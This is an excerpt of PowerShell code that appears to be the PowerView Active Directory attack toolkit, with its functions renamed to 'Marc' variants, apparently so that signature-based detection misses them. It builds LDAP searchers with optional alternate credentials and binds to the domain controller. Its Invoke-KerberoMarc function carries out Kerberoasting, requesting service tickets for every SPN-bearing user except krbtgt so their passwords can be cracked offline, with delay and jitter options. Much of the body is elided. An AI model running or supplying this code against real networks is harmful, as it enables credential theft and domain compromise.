...
function New-DomainSearcher {
    ...
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ...
            if ($PSBoundParameters['Credential']) {
                $DomainObject = Get-DomainMarc -Credential $Credential
            }
            else {
                $DomainObject = Get-DomainMarc
            }
        ...
        if (-not $PSBoundParameters['Server']) {
            try {
                ...
                elseif ($PSBoundParameters['Credential']) {
                    $BindServer = ((Get-DomainMarc -Credential $Credential).PdcRoleOwner).Name
                }
                else {
                    $BindServer = ((Get-DomainMarc).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[New-DomainSearcher] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $BindServer = $Server
        ...
        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[New-DomainSearcher] Using alternate credentials for LDAP connection"
...
function Get-DomainUserMarc {
    ...
    BEGIN {
        ...
        $UserSearcher = New-DomainSearcher @SearcherArguments
    }
        ...
        if ($UserSearcher) {
            ...
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    ...
                    $User = Convert-MarcLDAPProperty -Properties $_.Properties
...
function Invoke-KerberoMarc {
    ...
    PROCESS {
        ...
        Get-DomainUserMarc @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicketMarc -Delay $Delay -OutputFormat $OutputFormat -Jitter $Jitter
    }
